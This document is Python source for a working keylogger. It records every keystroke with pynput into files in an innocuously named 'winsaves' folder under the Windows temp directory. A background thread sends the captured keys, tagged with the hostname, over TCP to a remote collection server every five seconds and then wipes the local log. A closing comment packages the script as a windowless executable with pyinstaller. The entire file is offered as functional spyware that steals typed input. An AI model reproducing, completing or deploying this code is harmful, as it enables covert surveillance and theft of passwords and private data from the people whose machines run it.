import threading
from pynput import keyboard
import os
import socket
import time
import tempfile

ENCODING = 'utf-8'
pressed_keys = set()

server_ip = ''
server_port = 4500

# Define the directory for saving files in the Windows temp directory
winsaves_folder = os.path.join(tempfile.gettempdir(), "winsaves")
os.makedirs(winsaves_folder, exist_ok=True)  # Create the folder if it doesn't exist

hostname = socket.gethostname()
file_name = os.path.join(winsaves_folder, f"{hostname}_last_key.txt")

# Create keystrokes.txt or nothing if already exists
def create_keystrokes_file():
    keystrokes_path = os.path.join(winsaves_folder, "keystrokes.txt")
    if not os.path.exists(keystrokes_path):
        with open(keystrokes_path, 'w') as file:
            pass
        print("Created a keystrokes.txt file to write in.")
    else:
        print("keystrokes.txt already exists, writing into an existing one.")

# The logic behind logging the keys
def keylogger_callback(key):
    global pressed_keys

    # Determine the key name
    if hasattr(key, 'char') and key.char is not None:  # Check for valid character
        name = key.char
    elif hasattr(key, 'vk'):  # Check for virtual character
        if 96 <= key.vk <= 105:  # Check for numpad
            name = str(key.vk - 96)  # Convert code to characters
        else:
            name = key.vk
    elif hasattr(key, 'name'):
        name = key.name
    else:
        name = 'Unknown'

    # Ignore None values
    if name is None:
        return

    # Record the key press
    pressed_keys.add(name)

    # Paths for the files
    keystrokes_path = os.path.join(winsaves_folder, "keystrokes.txt")
    
    # Write keystrokes to the files
    with open(file_name, 'a', encoding=ENCODING) as last_key_file:
        last_key_file.write(str(name) + '\n')
    with open(keystrokes_path, 'a', encoding=ENCODING) as keystrokes_file:
        keystrokes_file.write(str(name) + '\n')

    # Trim keystrokes.txt if it exceeds 10,000 characters
    with open(keystrokes_path, 'r', encoding=ENCODING) as keystrokes_file:
        content = keystrokes_file.read()
        if len(content) >= 10000:
            content = content[4:]
            with open(keystrokes_path, 'w', encoding=ENCODING) as keystrokes_file:
                keystrokes_file.write(content)

# Handles key release
def on_release(key):
    global pressed_keys
    if hasattr(key, 'char') or hasattr(key, 'name'):
        name = key.char if hasattr(key, 'char') else key.name
        if name in pressed_keys:
            pressed_keys.remove(name)

# Starts the keylog listening process
def run_listener():
    with keyboard.Listener(on_press=keylogger_callback, on_release=on_release) as listener:
        listener.join()

# Sends the last keystrokes recorded in the last 5 seconds
def send_last_key():
    while True:
        hostname = socket.gethostname()
        # Get the file path within the "winsaves" directory
        file_path = os.path.join(winsaves_folder, f"{hostname}_last_key.txt")
        
        # Ensure we are only sending the base file name, not the full path
        file_name = os.path.basename(file_path)  # This will get only the file name

        # Check if the file exists
        if os.path.exists(file_path):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                try:
                    client_socket.connect((server_ip, server_port))
                    print("Connected to server.")

                    # Send only the base file name to the server
                    client_socket.send(len(file_name).to_bytes(4, byteorder='big'))
                    client_socket.send(file_name.encode())  # Send just the file name, not the full path
                    
                    # Send the file content
                    with open(file_path, "rb") as file:
                        file_data = file.read()

                    # Send the file content length and the actual file data
                    client_socket.send(len(file_data).to_bytes(8, byteorder='big'))
                    client_socket.send(file_data)

                    print(f"File {file_name} sent successfully.")  # Display the file name being sent
                except Exception as e:
                    print(f"Error: {e}")  # Handle error during file sending

            # Clear the contents of the file for new key logs
            open(file_path, 'w').close()

        # Sleep for 5 seconds before sending again
        time.sleep(5)

# Main loop
# Handles the whole script
if __name__ == '__main__':
    print("Keylogger initialized without any problems")
    create_keystrokes_file()   # Call the function to create keystrokes.txt

    # Start the keylogger listener thread
    listener_thread = threading.Thread(target=run_listener)
    listener_thread.start()

    # Start the thread for sending last_key.txt
    sender_thread = threading.Thread(target=send_last_key)
    sender_thread.start()

    try:
        listener_thread.join()
        sender_thread.join()
    except KeyboardInterrupt:
        pass

# pyinstaller --onefile --windowed target.py
